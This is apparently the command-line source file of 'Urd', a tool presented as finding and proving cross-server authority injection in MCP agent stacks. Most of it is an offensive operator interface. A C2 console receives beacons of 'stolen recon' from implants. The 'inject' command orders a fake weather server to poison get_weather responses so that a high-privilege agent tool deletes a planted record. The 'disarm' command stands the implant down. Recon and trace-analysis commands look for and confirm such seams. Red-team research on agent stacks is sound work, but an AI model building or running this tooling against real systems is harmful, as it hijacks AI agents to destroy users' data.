"""Urd command-line interface.

Urd finds and proves cross-server authority injection in MCP agent stacks:
where a low-privilege server's output can reach — or has already reached — a
high-privilege tool's argument.

  urd listen     [--port 8731]                     C2: run the operator console
  urd beacons                                      C2: what phoned home + the seam
  urd inject     --city C --target T               C2: order the implant to inject
  urd disarm     [--city C]                         C2: stand the implant down
  urd find-seams (--manifests DIR | --recon FILE)  recon: where can you inject?
  urd analyze    --manifests DIR --trace FILE       proof: did the injection land?
"""
from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

from urd import c2, recon as recon_mod
from urd.divergence import build_report, to_dot
from urd.manifests import build_declared_graph, load_manifests_dir
from urd.runtime import build_observed_graph
from urd.seams import find_static_seams, confirm_from_trace, build_seam_report
from urd.pretty import dim, head, ok, warn, bad, info, style

_E = sys.stderr  # human summaries go to stderr; color-gated on the stderr TTY


def _sev(tag: str) -> str:
    t = tag.upper()
    if t in ("HIGH", "CRITICAL", "CONFIRMED"):
        return bad(f"[{t}]", stream=_E)
    if t in ("MEDIUM",):
        return warn(f"[{t}]", stream=_E)
    return info(f"[{t}]", stream=_E)


def _load_graphs(manifests_dir: Path, trace_path: Path):
    if not manifests_dir.is_dir():
        raise FileNotFoundError(f"manifests directory not found: {manifests_dir}")
    if not trace_path.is_file():
        raise FileNotFoundError(f"trace file not found: {trace_path}")
    servers, host = load_manifests_dir(manifests_dir)
    declared = build_declared_graph(servers, host)
    observed = build_observed_graph(trace_path)
    return declared, observed


def _load_recon(recon_path: Path) -> dict:
    return json.loads(recon_path.read_text(encoding="utf-8"))


def cmd_find_seams(args: argparse.Namespace) -> int:
    # source of truth: a manifest dir (omniscient) OR a beacon of stolen recon
    if args.recon:
        recon_path = Path(args.recon)
        if not recon_path.is_file():
            print(bad(f"error: recon file not found: {recon_path}", stream=_E), file=_E)
            return 2
        try:
            servers, host = recon_mod.recon_to_manifests(_load_recon(recon_path))
        except (ValueError, KeyError) as exc:
            print(bad(f"error: malformed recon: {exc}", stream=_E), file=_E)
            return 2
        if not servers:
            print(warn("no servers in recon — implant hasn't beaconed schemas yet", stream=_E), file=_E)
    elif args.manifests:
        manifests_dir = Path(args.manifests)
        if not manifests_dir.is_dir():
            print(bad(f"error: manifests directory not found: {manifests_dir}", stream=_E), file=_E)
            return 2
        try:
            servers, host = load_manifests_dir(manifests_dir)
        except Exception as exc:  # noqa: BLE001 - surface manifest errors to the operator
            print(bad(f"error: {exc}", stream=_E), file=_E)
            return 2
    else:
        print(bad("error: pass --manifests DIR or --recon FILE", stream=_E), file=_E)
        return 2

    seams = find_static_seams(servers, host)

    if args.trace:
        trace_path = Path(args.trace)
        if not trace_path.is_file():
            print(bad(f"error: trace file not found: {trace_path}", stream=_E), file=_E)
            return 2
        observed = build_observed_graph(trace_path)
        seams = confirm_from_trace(seams, servers, observed)

    report = build_seam_report(seams)
    output_text = json.dumps(report, indent=2)
    if args.output:
        Path(args.output).parent.mkdir(parents=True, exist_ok=True)
        Path(args.output).write_text(output_text, encoding="utf-8")
        print(dim(f"wrote seam report: {args.output}"))
    else:
        print(output_text)

    print(
        dim("seams: ", stream=_E) + str(report['seam_count'])
        + dim("  critical: ", stream=_E) + bad(str(report['critical_count']), stream=_E)
        + dim("  confirmed: ", stream=_E) + bad(str(report['confirmed_count']), stream=_E),
        file=_E,
    )
    for s in report["seams"]:
        tag = "CONFIRMED" if s["confirmed"] else s["rank"].upper()
        val = "  value=" + bad(str(s['matched_value']), stream=_E) if s["matched_value"] else ""
        print(
            f"  {_sev(tag)} {style(s['source_server'], 'bold', stream=_E)}({s['source_privilege']}) -> "
            f"{style(s['sink_server'] + ':' + s['sink_tool'], 'bold', stream=_E)}({s['sink_param_path']}) "
            f"{dim('[' + s['privilege_crossing'] + ']', stream=_E)}{val}",
            file=_E,
        )
    # a critical seam is an actionable target; exit 1 so it can gate scripts
    return 1 if report["critical_count"] else 0


def cmd_analyze(args: argparse.Namespace) -> int:
    manifests_dir = Path(args.manifests)
    trace_path = Path(args.trace)

    if not manifests_dir.is_dir():
        print(bad(f"error: manifests directory not found: {manifests_dir}", stream=_E), file=_E)
        return 2
    if not trace_path.is_file():
        print(bad(f"error: trace file not found: {trace_path}", stream=_E), file=_E)
        return 2

    try:
        declared, observed = _load_graphs(manifests_dir, trace_path)
    except FileNotFoundError as exc:
        print(bad(f"error: {exc}", stream=_E), file=_E)
        return 2
    report = build_report(declared, observed)

    output_data = report.as_dict()
    output_text = json.dumps(output_data, indent=2)

    if args.output:
        Path(args.output).parent.mkdir(parents=True, exist_ok=True)
        Path(args.output).write_text(output_text, encoding="utf-8")
        print(dim(f"wrote divergence report: {args.output}"))
    else:
        print(output_text)

    if args.dot:
        dot_text = to_dot(declared, observed, report.findings)
        Path(args.dot).parent.mkdir(parents=True, exist_ok=True)
        Path(args.dot).write_text(dot_text, encoding="utf-8")
        print(dim(f"wrote DOT graph: {args.dot}"))

    # summary to stderr so it doesn't pollute piped JSON
    print(
        dim(
            f"declared edges: {report.declared_edge_count}  "
            f"observed edges: {report.observed_edge_count}  "
            f"findings: {len(report.findings)}",
            stream=_E,
        ),
        file=_E,
    )
    for f in report.findings:
        print(f"  {_sev(f.severity)} {style(f.finding_id, 'bold', stream=_E)}: {f.title}", file=_E)

    return 0 if not report.findings else 1


def _c2_url(args: argparse.Namespace) -> str:
    return getattr(args, "url", None) or c2.default_url(port=getattr(args, "port", c2.DEFAULT_PORT))


def _print_recon_seam(recon: dict) -> None:
    """Show the operator what the beacon reveals: the exfil, then the seam it enables."""
    rows = recon_mod.coresident_summary(recon)
    names = recon_mod.display_names(recon)
    implant = recon.get("implant", "implant")
    print(dim(f"  recon from {implant} (host {recon.get('host', '?')}):", stream=_E), file=_E)
    for r in rows:
        op = bad(r["operation"], stream=_E) if r["operation"] == "destructive" else dim(r["operation"], stream=_E)
        print(f"    {style(str(r['server']), 'bold', stream=_E)}({r['privilege']}) "
              f"{r['tool']} [{op}]", file=_E)
    servers, host = recon_mod.recon_to_manifests(recon)
    seams = find_static_seams(servers, host)
    report = build_seam_report(seams)
    for s in report["seams"]:
        src = names.get(s["source_server"], s["source_server"])
        dst = names.get(s["sink_server"], s["sink_server"])
        print("    " + _sev(s["rank"].upper())
              + f" {style(src, 'bold', stream=_E)} -> "
              + f"{style(dst + ':' + s['sink_tool'], 'bold', stream=_E)}({s['sink_param_path']}) "
              + dim(f"[{s['privilege_crossing']}]", stream=_E), file=_E)


def cmd_listen(args: argparse.Namespace) -> int:
    def on_event(kind: str, body: dict) -> None:
        if kind == "beacon":
            print(head(f"\n[beacon] {body.get('implant', '?')} installed on {body.get('host', '?')}",
                       stream=_E), file=_E)
            _print_recon_seam(body)
            print(dim("  waiting for orders — issue: urd inject --city CITY --target LABEL", stream=_E),
                  file=_E)
        elif kind == "command":
            act = body.get("action")
            where = f"{body.get('city', '')}={body.get('target', '')}".strip("=")
            print(ok(f"[order] {act} {body.get('implant', '')} {where}", stream=_E), file=_E)

    server, _ = c2.make_server(port=args.port, on_event=on_event)
    bound = server.server_address
    print(head(f"urd C2 console listening on http://{bound[0]}:{bound[1]}", stream=_E), file=_E)
    print(dim("  implants beacon here on install; drive them with `urd inject` / `urd disarm`.",
              stream=_E), file=_E)
    print(dim("  Ctrl-C to stop.", stream=_E), file=_E)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(dim("\n  console stopped.", stream=_E), file=_E)
    finally:
        server.server_close()
    return 0


def cmd_beacons(args: argparse.Namespace) -> int:
    try:
        snap = c2.get_beacons(_c2_url(args))
    except Exception as exc:  # noqa: BLE001 - the console may not be running
        print(bad(f"error: can't reach the C2 console ({exc}); is `urd listen` running?", stream=_E),
              file=_E)
        return 2
    beacons = snap.get("beacons", [])
    injections = snap.get("injections", [])
    print(json.dumps(snap, indent=2))
    if not beacons:
        print(dim("no implants have beaconed yet.", stream=_E), file=_E)
        return 0
    for b in beacons:
        print(head(f"\n{b.get('implant', '?')} @ {b.get('host', '?')}", stream=_E), file=_E)
        _print_recon_seam(b)
    if injections:
        print(ok(f"\nstanding inject orders: {injections}", stream=_E), file=_E)
    return 0


def cmd_inject(args: argparse.Namespace) -> int:
    try:
        resp = c2.send_command(_c2_url(args), "inject", args.implant, city=args.city, target=args.target)
    except Exception as exc:  # noqa: BLE001
        print(bad(f"error: can't reach the C2 console ({exc}); is `urd listen` running?", stream=_E),
              file=_E)
        return 2
    print(ok(f"armed: {args.implant} will inject {args.target!r} into get_weather({args.city!r})",
             stream=_E), file=_E)
    print(dim(f"  standing orders now: {resp.get('injections')}", stream=_E), file=_E)
    return 0


def cmd_disarm(args: argparse.Namespace) -> int:
    try:
        resp = c2.send_command(_c2_url(args), "disarm", args.implant, city=args.city or "")
    except Exception as exc:  # noqa: BLE001
        print(bad(f"error: can't reach the C2 console ({exc}); is `urd listen` running?", stream=_E),
              file=_E)
        return 2
    where = f"get_weather({args.city!r})" if args.city else "all cities"
    print(ok(f"stood down: {args.implant} no longer injects {where}", stream=_E), file=_E)
    print(dim(f"  standing orders now: {resp.get('injections')}", stream=_E), file=_E)
    return 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="urd",
        description="Find and prove cross-server authority injection in MCP agent stacks.",
    )
    sub = parser.add_subparsers(dest="command", required=True)

    p_listen = sub.add_parser("listen", help="C2: run the operator console implants beacon to")
    p_listen.add_argument("--port", type=int, default=c2.DEFAULT_PORT, help="Port to bind (default 8731)")
    p_listen.set_defaults(func=cmd_listen)

    p_beacons = sub.add_parser("beacons", help="C2: show what has phoned home and the seam it reveals")
    p_beacons.add_argument("--url", default=None, help="C2 console URL (default http://127.0.0.1:8731)")
    p_beacons.set_defaults(func=cmd_beacons)

    p_inject = sub.add_parser("inject", help="C2: order an implant to inject a target into a city's weather")
    p_inject.add_argument("--city", required=True, help="City whose get_weather response to poison")
    p_inject.add_argument("--target", required=True, help="Record label to plant for the host to delete")
    p_inject.add_argument("--implant", default="weather-fake", help="Implant id (default weather-fake)")
    p_inject.add_argument("--url", default=None, help="C2 console URL (default http://127.0.0.1:8731)")
    p_inject.set_defaults(func=cmd_inject)

    p_disarm = sub.add_parser("disarm", help="C2: stand an implant down (one city, or all)")
    p_disarm.add_argument("--city", default=None, help="City to stand down (omit for all)")
    p_disarm.add_argument("--implant", default="weather-fake", help="Implant id (default weather-fake)")
    p_disarm.add_argument("--url", default=None, help="C2 console URL (default http://127.0.0.1:8731)")
    p_disarm.set_defaults(func=cmd_disarm)

    p_seams = sub.add_parser(
        "find-seams",
        help="Recon: enumerate low-trust -> high-trust injection seams in a target",
    )
    p_seams.add_argument("--manifests", default=None, help="Directory of *.json manifests")
    p_seams.add_argument("--recon", default=None,
                         help="Beacon JSON of stolen recon (alternative to --manifests)")
    p_seams.add_argument("--trace", default=None,
                         help="Optional captured session to confirm which seams fired")
    p_seams.add_argument("--output", default=None, help="Write JSON seam report to this path")
    p_seams.set_defaults(func=cmd_find_seams)

    p_analyze = sub.add_parser("analyze", help="Proof: reconstruct the authority path an injection took")
    p_analyze.add_argument("--manifests", required=True, help="Directory of *.json manifests")
    p_analyze.add_argument("--trace", required=True, help="JSONL trace file to analyze")
    p_analyze.add_argument("--output", default=None, help="Write JSON report to this path")
    p_analyze.add_argument("--dot", default=None, help="Optionally write DOT graph to this path")
    p_analyze.set_defaults(func=cmd_analyze)

    return parser


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
